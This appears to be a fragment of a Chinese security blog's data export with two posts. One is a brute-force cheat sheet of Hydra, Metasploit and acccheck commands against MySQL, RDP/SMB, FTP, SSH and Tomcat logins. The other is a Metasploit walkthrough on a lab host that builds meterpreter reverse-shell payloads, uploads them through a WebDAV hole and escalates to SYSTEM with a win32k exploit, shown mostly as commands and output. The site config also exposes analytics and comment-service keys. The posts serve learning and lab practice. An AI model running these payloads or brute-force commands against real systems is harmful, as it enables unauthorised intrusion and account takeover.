-V</p>\n<h4 id=\"2-6-ssh爆破\"><a href=\"#2-6-ssh爆破\" class=\"headerlink\" title=\"2.6 ssh爆破\"></a>2.6 ssh爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.6.1 Metasploit<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ssh/ssh_login<br>&emsp;&emsp;&emsp;&emsp;2.6.2 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#hydra 192.168.146.141 -l root -P /top1500.txt ssh -V</p>\n<h4 id=\"2-7-Webshell爆破\"><a href=\"#2-7-Webshell爆破\" class=\"headerlink\" title=\"2.7 Webshell爆破\"></a>2.7 Webshell爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.7.1 BurpSuite</p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p><strong>字典虽小，够用就行</strong><br>","more":"</p>\n<h3 id=\"二、-暴力破解\"><a href=\"#二、-暴力破解\" class=\"headerlink\" title=\"二、 暴力破解\"></a>二、 暴力破解</h3><h4 id=\"2-1-mysql数据库破解\"><a href=\"#2-1-mysql数据库破解\" class=\"headerlink\" title=\"2.1 mysql数据库破解\"></a>2.1 mysql数据库破解</h4><p>&emsp;&emsp;# 爆破数据库账号密码，数据库必须要开启3306远程登录<br>&emsp;&emsp;&emsp;&emsp;2.1.1 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 用户名 -P 字典 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l root -P dist.txt mysql -V<br>&emsp;&emsp;&emsp;&emsp;2.1.2 HexorBase<br>&emsp;&emsp;&emsp;&emsp;2.1.3 metasploit（search查找模块、back返回）<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/mysql/mysql_login<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# show options<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set host IP地址<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set username 用户<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set PASS_FILE dist.txt<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set port 端口号<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;run</p>\n<h4 id=\"2-2-mysql数据库配置（对外）\"><a href=\"#2-2-mysql数据库配置（对外）\" class=\"headerlink\" title=\"2.2 mysql数据库配置（对外）\"></a>2.2 mysql数据库配置（对外）</h4><p>&emsp;&emsp;&emsp;&emsp;2.2.1 3306端口对外开放<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;grant all privileges on <em>.</em> to ‘root‘@’%’ identified by ‘123456’ with grant option;<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;flush privileges;（root，123456）<br>&emsp;&emsp;&emsp;&emsp;2.2.2 Navicat数据库管理软件<br>&emsp;&emsp;&emsp;&emsp;2.2.3 报错解决方案<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;is blocked because of many connec错误解决方案：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;进入Mysql数据库查看max_connect_errors：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like ‘max_connect_errors’;<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;修改max_connect_errors的数量为1000：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set global max_connect_errors = 1000;<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;查看是否修改成功：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like ‘max_connect_errors’;</p>\n<h4 id=\"2-3-3389远程连接爆破\"><a href=\"#2-3-3389远程连接爆破\" class=\"headerlink\" title=\"2.3 3389远程连接爆破\"></a>2.3 3389远程连接爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.3.1 DuBrute<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;这个只能爆rdp的，smb的用下面（比如win server）<br>&emsp;&emsp;&emsp;&emsp;2.3.2 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l administrator -P /top1500.txt rdp -V  (rdp可以换smb)<br>&emsp;&emsp;&emsp;&emsp;2.3.3 acccheck（smb）<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -U user.txt -P password.txt<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -u tian -P dic.txt<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;结果保存在cracked文件中</p>\n<h4 id=\"2-4-Web-Tomcat中间件\"><a href=\"#2-4-Web-Tomcat中间件\" class=\"headerlink\" title=\"2.4 Web-Tomcat中间件\"></a>2.4 Web-Tomcat中间件</h4><p>&emsp;&emsp;&emsp;&emsp;2.4.1 Metasploit<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/http/tomcat_mgr_login<br>&emsp;&emsp;&emsp;&emsp;2.4.3 对外访问<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Server.xml<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;Engine name=”Catalina” defaultHost=”IP地址”><br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;Host name=”IP地址” appBase=”webapps” npackWARs=”true” autoDeploy=”true”></p>\n<h4 id=\"2-5-ftp爆破\"><a href=\"#2-5-ftp爆破\" class=\"headerlink\" title=\"2.5 ftp爆破\"></a>2.5 ftp爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.5.1 Metasploit<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ftp/ftp_login<br>&emsp;&emsp;&emsp;&emsp;2.5.2 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l admin -P /top1500.txt ftp -V</p>\n<h4 id=\"2-6-ssh爆破\"><a href=\"#2-6-ssh爆破\" class=\"headerlink\" title=\"2.6 ssh爆破\"></a>2.6 ssh爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.6.1 Metasploit<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ssh/ssh_login<br>&emsp;&emsp;&emsp;&emsp;2.6.2 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#hydra 192.168.146.141 -l root -P /top1500.txt ssh -V</p>\n<h4 id=\"2-7-Webshell爆破\"><a href=\"#2-7-Webshell爆破\" class=\"headerlink\" title=\"2.7 Webshell爆破\"></a>2.7 Webshell爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.7.1 BurpSuite</p>"},{"title":"metasploit深入学习之ms18_8120&&vsftpd2.3.4","index_img":"/img/2019-01-22/index.jpg","date":"2019-01-22T12:32:23.000Z","_content":"metasploit是一款非常给力的后渗透系统，本次通过复现vsftpd2.3.4的漏洞和ms18_8120的漏洞来学习metasploit\n<!--more-->\n#### 介绍\n&emsp;&emsp;首先一点，为什么metaslpoit（下称msf）强大呢，msf本身就有1851个漏洞利用模块，1046个辅助模块，541个漏洞利用模块，44个加密模块（v5.0.1），不仅如此，他还可以调用外部插件，而且本身也是开源的，也可以加载自己写的模块，msf很好但也不是最好的，本次主要是以学习msf为主，当然实验环境下也有更好的入侵方法。\n&emsp;&emsp;进入msf的命令是msfconsole，如果提示数据库为开启则可以用`/etc/init.d/postgresql start`开启metasploit的数据库，如果你需要完成一次渗透测试，如果你手上没有合适的工具的话，msf可以完成所有的工作\n#### 一、扫描\n&emsp;&emsp;msf调用nmap扫描的命令是大`db_nmap`，具体用法和nmap使用差不多，也可以使用msf的扫描模块进行扫描，常用的扫描模块有`brute_dirs`,`dir_listing`,`dir_scanner`。\n#### 二、复现\n&emsp;&emsp;目标主机192.168.1.66:8585上存在一个dav2的上传漏洞，攻击思路大概是我们可以先利用这个上传漏洞上传一个payload，实验入侵主机到进一步提权。\n首先我们先制作一个payload\n```\nroot@kali:~# msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.1.70 lport=13579 -f raw > /root/Desktop/13579.php\n[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\n[-] No arch selected, selecting arch: php from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 30656 bytes\n\n```\n`-p`选择payload，`lhost`是本地ip，`lport`为本地监听端口，`-f`格式，`>`输出为文件\n\n然后我们需要上传脚本，上传脚本会用到davtest这个工具，davtest支持自动发送文件漏洞，目录自动随机帮助隐藏文件，发送文本文件，并尝试移动到可执行文件的名称，上传的文件自动清理，发送任意文件。\n```\nroot@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13579.php -uploadloc 13579.php \n********************************************************\n Testing DAV connection\nOPEN\t\tSUCCEED:\t\thttp://192.168.1.66:8585/uploads\n********************************************************\n unless  Uploading file\nUpload succeeded: http://192.168.1.66:8585/uploads/13579.php\n```\n`-url`是网址，`-uploadfile`是要上传的文件，`-uploadloc`是要上传的位置。准备好了就可以开始打了\n```\nroot@kali:~# msfconsole -q\n[-] ***\n[-] * WARNING: No database support: could not connect to server: Connection refused\n\tIs the server running on host \"localhost\" (::1) and accepting\n\tTCP/IP connections on port 5432?\ncould not connect to server: Connection refused\n\tIs the server running on host \"localhost\" (127.0.0.1) and accepting\n\tTCP/IP connections on port 5432?\n\n[-] ***\n[*] Starting persistent handler(s)...\nmsf5 > use exploit/multi/handler \nmsf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp \npayload => php/meterpreter_reverse_tcp\nmsf5 exploit(multi/handler) > set lport 13579\nlport => 13579\nmsf5 exploit(multi/handler) > set lhost 192.168.1.70\nlhost => 192.168.1.70\nmsf5 exploit(multi/handler) > exploit -j -z\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 192.168.1.70:13579 \n```\n启动msf时-q是不显示封面，`exploit -j -z`-j是把exploit放到jobs里，-z挂后台，jobs的意思是当监听到反弹的shell之后会建立一个session，然后不会不停下来，继续监听。session的可以理解为一个会话。到这里，我们只需要访问一下我们上传的payload就可以反弹shell了(可以用浏览器访问)\n```\ncurl http://192.168.1.66:8585/uploads/13579.php\n```\ngetshell\n```\nmsf5 exploit(multi/handler) > [*] Meterpreter session 1 opened (192.168.1.70:13579 -> 192.168.1.66:49816) at 2019-01-22 02:30:29 -0500\n[*] Meterpreter session 2 opened (192.168.1.70:13579 -> 192.168.1.66:49817) at 2019-01-22 02:30:31 -0500\n\nmeterpreter > background\nmsf5 exploit(multi/handler) > sessions \n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                          Connection\n  --  ----  ----                     -----------                          ----------\n  1         meterpreter php/windows  LOCAL SERVICE (0) @ METASPLOITABLE3  192.168.1.70:13579 -> 192.168.1.66:49816 (192.168.1.66)\n```\nbackground是返回msf控制台，getshell之后得到的shell是local server的权限，我们上传一个另外一个payload上去get更高权限的shell\n```\nroot@kali:~/Desktop# msfvenom -p windows/meterpreter_reverse_tcp Lhost=192.168.1.70 lport=13789 -f exe > 13789.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 179779 bytes\nFinal size of exe file: 254976 bytes\n```\n上传\n```\nroot@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13789.exe -uploadloc 13789.exe\n********************************************************\n Testing DAV connection\nOPEN\t\tSUCCEED:\t\thttp://192.168.1.66:8585/uploads\n********************************************************\n unless  Uploading file\nUpload succeeded: http://192.168.1.66:8585/uploads/13789.exe\n```\nmsf开启监听,`sessions -i 1`选择id为1的session，`getwd`获取当前绝对路径，`execute -f`执行文件\n```\nmsf5 exploit(multi/handler) > set payload windows/meterpreter_reverse_tcp \npayload => windows/meterpreter_reverse_tcp\nmsf5 exploit(multi/handler) > show options \nmsf5 exploit(multi/handler) > set lport 13789\nlport => 13789\nmsf5 exploit(multi/handler) > exploit -j -z\n\nmsf5 exploit(multi/handler) > sessions -i 1\n[*] Exploit running as background job 1.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 192.168.1.70:13789 \n\nmsf5 exploit(multi/handler) > sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter > getwd\nC:\\wamp\\www\\uploads\nmeterpreter > execute -f \"C:\\\\wamp\\\\www\\\\uploads\\\\13789.exe\"\nProcess 1372 created.\nmeterpreter > [*] Meterpreter session 3 opened (192.168.1.70:13789 -> 192.168.1.66:50670) at 2019-01-22 02:38:39 -0500\n```\n我们用上传的第一个payload执行我们的第二次payload，就可以得到普通用户权限\n```\nmsf5 exploit(multi/handler) > sessions \nActive sessions\n===============\n\n  Id  Name  Type                     Information                                   Connection\n  --  ----  ----                     -----------                                   ----------\n  1         meterpreter php/windows  LOCAL SERVICE (0) @ METASPLOITABLE3           192.168.1.70:13579 -> 192.168.1.66:53138 (192.168.1.66)\n  2         meterpreter x86/windows  NT AUTHORITY\\LOCAL SERVICE @ METASPLOITABLE3  192.168.1.70:13789 -> 192.168.1.66:54852 (192.168.1.66)\n```\n接下来用ms18_8120提权\n\n```\nmsf5 exploit(multi/handler) > use exploit/windows/local/ms18_8120_win32k_privesc \nmsf5 exploit(windows/local/ms18_8120_win32k_privesc) > set session 3\nsession => 3\n\nmsf5 exploit(windows/local/ms18_8120_win32k_privesc) > exploit \n\n[*] Started reverse TCP handler on 192.168.1.70:4444 \n[*] Sending stage (179779 bytes) to 192.168.1.66\n[+] Exploit finished, wait for privileged payload execution to complete.\n[*] Meterpreter session 4 opened (192.168.1.70:4444 -> 192.168.1.66:50799) at 2019-01-22 02:42:04 -0500\n\nmeterpreter > \n\n```\n查看sessions就可以看到普通用户权限变成了system权限\n```\nmsf5 exploit(windows/local/ms18_8120_win32k_privesc) > sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                                   Connection\n  --  ----  ----                     -----------                                   ----------\n  1         meterpreter php/windows  LOCAL SERVICE (0) @ METASPLOITABLE3           192.168.1.70:13579 -> 192.168.1.66:53138 (192.168.1.66)\n  2         meterpreter x86/windows  NT AUTHORITY\\LOCAL SERVICE @ METASPLOITABLE3  192.168.1.70:13789 -> 192.168.1.66:54852 (192.168.1.66)\n  3         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ METASPLOITABLE3         192.168.1.70:4444 -> 192.168.1.66:62289 (192.168.1.66)\n```\n到此，复现完毕","source":"_posts/2019-01-22-msf.md","raw":"---\ntitle: metasploit深入学习之ms18_8120&&vsftpd2.3.4\nindex_img: /img/2019-01-22/index.jpg\ndate: 2019-01-22 20:32:23\ntags: \n- \n---\nmetasploit是一款非常给力的后渗透系统，本次通过复现vsftpd2.3.4的漏洞和ms18_8120的漏洞来学习metasploit\n<!--more-->\n#### 介绍\n&emsp;&emsp;首先一点，为什么metaslpoit（下称msf）强大呢，msf本身就有1851个漏洞利用模块，1046个辅助模块，541个漏洞利用模块，44个加密模块（v5.0.1），不仅如此，他还可以调用外部插件，而且本身也是开源的，也可以加载自己写的模块，msf很好但也不是最好的，本次主要是以学习msf为主，当然实验环境下也有更好的入侵方法。\n&emsp;&emsp;进入msf的命令是msfconsole，如果提示数据库为开启则可以用`/etc/init.d/postgresql start`开启metasploit的数据库，如果你需要完成一次渗透测试，如果你手上没有合适的工具的话，msf可以完成所有的工作\n#### 一、扫描\n&emsp;&emsp;msf调用nmap扫描的命令是大`db_nmap`，具体用法和nmap使用差不多，也可以使用msf的扫描模块进行扫描，常用的扫描模块有`brute_dirs`,`dir_listing`,`dir_scanner`。\n#### 二、复现\n&emsp;&emsp;目标主机192.168.1.66:8585上存在一个dav2的上传漏洞，攻击思路大概是我们可以先利用这个上传漏洞上传一个payload，实验入侵主机到进一步提权。\n首先我们先制作一个payload\n```\nroot@kali:~# msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.1.70 lport=13579 -f raw > /root/Desktop/13579.php\n[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\n[-] No arch selected, selecting arch: php from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 30656 bytes\n\n```\n`-p`选择payload，`lhost`是本地ip，`lport`为本地监听端口，`-f`格式，`>`输出为文件\n\n然后我们需要上传脚本，上传脚本会用到davtest这个工具，davtest支持自动发送文件漏洞，目录自动随机帮助隐藏文件，发送文本文件，并尝试移动到可执行文件的名称，上传的文件自动清理，发送任意文件。\n```\nroot@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13579.php -uploadloc 13579.php \n********************************************************\n Testing DAV connection\nOPEN\t\tSUCCEED:\t\thttp://192.168.1.66:8585/uploads\n********************************************************\n unless  Uploading file\nUpload succeeded: http://192.168.1.66:8585/uploads/13579.php\n```\n`-url`是网址，`-uploadfile`是要上传的文件，`-uploadloc`是要上传的位置。准备好了就可以开始打了\n```\nroot@kali:~# msfconsole -q\n[-] ***\n[-] * WARNING: No database support: could not connect to server: Connection refused\n\tIs the server running on host \"localhost\" (::1) and accepting\n\tTCP/IP connections on port 5432?\ncould not connect to server: Connection refused\n\tIs the server running on host \"localhost\" (127.0.0.1) and accepting\n\tTCP/IP connections on port 5432?\n\n[-] ***\n[*] Starting persistent handler(s)...\nmsf5 > use exploit/multi/handler \nmsf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp \npayload => php/meterpreter_reverse_tcp\nmsf5 exploit(multi/handler) > set lport 13579\nlport => 13579\nmsf5 exploit(multi/handler) > set lhost 192.168.1.70\nlhost => 192.168.1.70\nmsf5 exploit(multi/handler) > exploit -j -z\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 192.168.1.70:13579 \n```\n启动msf时-q是不显示封面，`exploit -j -z`-j是把exploit放到jobs里，-z挂后台，jobs的意思是当监听到反弹的shell之后会建立一个session，然后不会不停下来，继续监听。session的可以理解为一个会话。到这里，我们只需要访问一下我们上传的payload就可以反弹shell了(可以用浏览器访问)\n```\ncurl http://192.168.1.66:8585/uploads/13579.php\n```\ngetshell\n```\nmsf5 exploit(multi/handler) > [*] Meterpreter session 1 opened (192.168.1.70:13579 -> 192.168.1.66:49816) at 2019-01-22 02:30:29 -0500\n[*] Meterpreter session 2 opened (192.168.1.70:13579 -> 192.168.1.66:49817) at 2019-01-22 02:30:31 -0500\n\nmeterpreter > background\nmsf5 exploit(multi/handler) > sessions \n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                          Connection\n  --  ----  ----                     -----------                          ----------\n  1         meterpreter php/windows  LOCAL SERVICE (0) @ METASPLOITABLE3  192.168.1.70:13579 -> 192.168.1.66:49816 (192.168.1.66)\n```\nbackground是返回msf控制台，getshell之后得到的shell是local server的权限，我们上传一个另外一个payload上去get更高权限的shell\n```\nroot@kali:~/Desktop# msfvenom -p windows/meterpreter_reverse_tcp Lhost=192.168.1.70 lport=13789 -f exe > 13789.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 179779 bytes\nFinal size of exe file: 254976 bytes\n```\n上传\n```\nroot@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13789.exe -uploadloc 13789.exe\n********************************************************\n Testing DAV connection\nOPEN\t\tSUCCEED:\t\thttp://192.168.1.66:8585/uploads\n********************************************************\n unless  Uploading file\nUpload succeeded: http://192.168.1.66:8585/uploads/13789.exe\n```\nmsf开启监听,`sessions -i 1`选择id为1的session，`getwd`获取当前绝对路径，`execute -f`执行文件\n```\nmsf5 exploit(multi/handler) > set payload windows/meterpreter_reverse_tcp \npayload => windows/meterpreter_reverse_tcp\nmsf5 exploit(multi/handler) > show options \nmsf5 exploit(multi/handler) > set lport 13789\nlport => 13789\nmsf5 exploit(multi/handler) > exploit -j -z\n\nmsf5 exploit(multi/handler) > sessions -i 1\n[*] Exploit running as background job 1.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 192.168.1.70:13789 \n\nmsf5 exploit(multi/handler) > sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter > getwd\nC:\\wamp\\www\\uploads\nmeterpreter > execute -f \"C:\\\\wamp\\\\www\\\\uploads\\\\13789.exe\"\nProcess 1372 created.\nmeterpreter > [*] Meterpreter session 3 opened (192.168.1.70:13789 -> 192.168.1.66:50670) at 2019-01-22 02:38:39 -0500\n```\n我们用上传的第一个payload执行我们的第二次payload，就可以得到普通用户权限\n```\nmsf5 exploit(multi/handler) > sessions \nActive sessions\n===============\n\n  Id  Name  Type                     Information                                   Connection\n  --  ----  ----                     -----------                                   ----------\n  1         meterpreter php/windows  LOCAL SERVICE (0) @ METASPLOITABLE3           192.168.1.70:13579 -> 192.168.1.66:53138 (192.168.1.66)\n  2         meterpreter x86/windows  NT AUTHORITY\\LOCAL SERVICE @ METASPLOITABLE3  192.168.1.70:13789 -> 192.168.1.66:54852 (192.168.1.66)\n```\n接下来用ms18_8120提权\n\n```\nmsf5 exploit(multi/handler) > use exploit/windows/local/ms18_8120_win32k_privesc \nmsf5 exploit(windows/local/ms18_8120_win32k_privesc) > set session 3\nsession => 3\n\nmsf5 exploit(windows/local/ms18_8120_win32k_privesc) > exploit \n\n[*] Started reverse TCP handler on 192.168.1.70:4444 \n[*] Sending stage (179779 bytes) to 192.168.1.66\n[+] Exploit finished, wait for privileged payload execution to complete.\n[*] Meterpreter session 4 opened (192.168.1.70:4444 -> 192.168.1.66:50799) at 2019-01-22 02:42:04 -0500\n\nmeterpreter > \n\n```\n查看sessions就可以看到普通用户权限变成了system权限\n```\nmsf5 exploit(windows/local/ms18_8120_win32k_privesc) > sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                                   Connection\n  --  ----  ----                     -----------                                   ----------\n  1         meterpreter php/windows  LOCAL SERVICE (0) @ METASPLOITABLE3           192.168.1.70:13579 -> 192.168.1.66:53138 